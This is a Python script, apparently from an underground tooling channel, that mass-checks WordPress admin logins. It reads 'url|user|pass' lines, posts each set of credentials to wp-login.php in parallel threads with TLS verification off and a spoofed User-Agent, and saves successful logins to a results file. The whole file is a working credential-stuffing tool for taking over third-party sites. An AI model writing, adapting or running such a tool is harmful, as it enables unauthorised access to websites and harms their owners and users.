import requests
import os
from multiprocessing.dummy import Pool
from colorama import Fore, init

requests.packages.urllib3.disable_warnings()
init()

red = Fore.RED
green = Fore.GREEN
reset = Fore.RESET
yellow = Fore.YELLOW
blue = Fore.BLUE
cyan = Fore.CYAN
white = Fore.WHITE

fg = [
    '\033[91;1m',  # red 0
    '\033[92;1m',  # green 1
    '\033[93;1m',  # yellow 2
    '\033[94;1m',  # blue 3
    '\033[95;1m',  # magenta 4
    '\033[96;1m',  # cyan 5
    '\033[97;1m'  # white 6
]

os.makedirs("Results", exist_ok=True)

def banner():
    print('''
    
            {0}   _____          __          _______  
            {0} / ____|         \ \        / /  __ \ 
            {1}| (___  _ __  _   \ \  /\  / /| |__) |
            {1} \___ \| '_ \| | | \ \/  \/ / |  ___/ 
            {2} ____) | |_) | |_| |\  /\  /  | |     
            {2}|_____/| .__/ \__, | \/  \/   |_|     
            {3}       | |     __/ |                  
            {3}       |_|    |___/     channel : @spydev_channel                                           
           {2}\\━━━━━━━┯━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━/
           \t├╼ {3}BY : spydev{2}
           \t├╼ {3}Wordpress Panel Checker
           \t└╼ {2}[Important] - > TEXT-Format : ' http://site.com/wp-login.php|user|pass '
        \033[0m'''.format(fg[1], fg[0], fg[5], fg[3]))

def login(target):
    try:
        format = target.split('|')
        url, user, pwd = format[0], format[1], format[2]
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 RuxitSynthetic/1.0 v3652647187556729212 t6142409407075435073 ath259cea6f altpriv cvcv=2 smf=0'
        }

        cook = requests.Session()
        cooki = cook.get(url, allow_redirects=False)
        cookies = dict(cooki.cookies)
        url_dash = url.replace('/wp-login.php', '')
        payload = {'log': f'{user}', 'pwd': f'{pwd}', 'wp-submit': 'Log+In', 'redirect_to': f'{url_dash}/wp-admin/',
                   'testcookie': '1'}
        req = requests.post(url, data=payload, headers=headers, allow_redirects=True, cookies=cookies,
                            verify=False).content.decode('utf8')
        if 'dashboard' in req or 'Howdy, ' in req or '/wp-admin/admin-ajax.php' in req:
            print(f'''
{green}[Success]{reset}
{url}
User : {yellow}{user}{reset}
Pass : {yellow}{pwd}{reset}
{fg[3]}----------------------------------------------------{reset}
            ''')
            open('Results/WP_Success.txt', 'a+', encoding="utf8").write(f'{url}\nUser : {user}\nPass : {pwd}\n\n')
        else:
            print(f'''
{red}[Failed]{reset}
URL  : {url}
{fg[3]}----------------------------------------------------{reset}
            ''')
            open('Results/Not_working.txt', 'a+', encoding="utf8").write(target + '\n')
    except requests.exceptions.Timeout:
        print(f'''
{red}[Connection Timeout]{reset}
URL  : {url}
{fg[3]}----------------------------------------------------{reset}
        ''')
    except requests.exceptions.ConnectionError:
        print(f'''
{red}[Network Unreachable]{reset}
URL  : {url}
{fg[3]}----------------------------------------------------{reset}
        ''')
    except Exception as e:
        print(f'''
{red}[Error]{reset}
URL  : {url}
{fg[3]}----------------------------------------------------{reset}
        ''')


def main():
    try:
        if os.name == "nt":
            os.system('cls')
        elif os.name == "posix":
            os.system('clear')
        else:
            pass
        banner()
        file = list(dict.fromkeys(open(input("[List] : ")).read().splitlines()))
        thread = int(input("[Thread] : "))
        pool = Pool(thread)
        pool.map(login, file)
        pool.close()
        pool.join()
    except Exception as e:
        print(e)
        exit()


if __name__ == "__main__":
    main()
